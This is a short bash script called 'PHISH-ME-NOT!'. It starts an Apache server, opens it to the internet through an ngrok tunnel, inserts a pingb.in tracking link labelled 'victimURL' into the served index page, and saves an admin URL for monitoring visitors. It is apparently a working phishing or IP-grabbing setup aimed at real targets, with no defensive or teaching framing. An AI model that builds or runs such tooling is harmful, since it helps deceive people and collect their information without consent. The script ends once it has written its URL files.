#!/bin/bash
rm results.txt>/dev/null 2>&1
rm ips>/dev/null 2>&1
RED='\e[38;5;196m'
GREEN='\e[38;5;46m' 
GOLD='\e[38;5;226m'
GREY='\033[0;37m'
echo -e "${GOLD}${BOLD}$(figlet -f slant  PHISH-ME-NOT!)"
echo -e "${RED}${BOLD}\t\t\t\t\tThis is not a drill."
echo -e "${GREEN}[+] Starting Apache server"
service apache2 start
echo -e "${GREEN}[+] Hosting local server on the internet through NGROK"
ngrok tcp 80 --log=stdout >log & sleep 7 >/dev/null 2>&1  
cat log| grep url= | awk -F "=" '{print $8}' >ngrokURL
rm log
sed -i 's/tcp:/http:/g' ngrokURL
pingb=$(curl pingb.in 2>&1 | cut -d "\"" -f 2 | xargs | sed "s/.*\//\//g" | xargs -I{} echo {})
url="http://pingb.in$pingb"
victimURL="http://pingb.in/p$pingb"
sudo sed -i "s#REPLACE_ME#${victimURL}#g" /var/www/html/index.html
echo ${url} > adminURL
echo $victimURL > victimURL
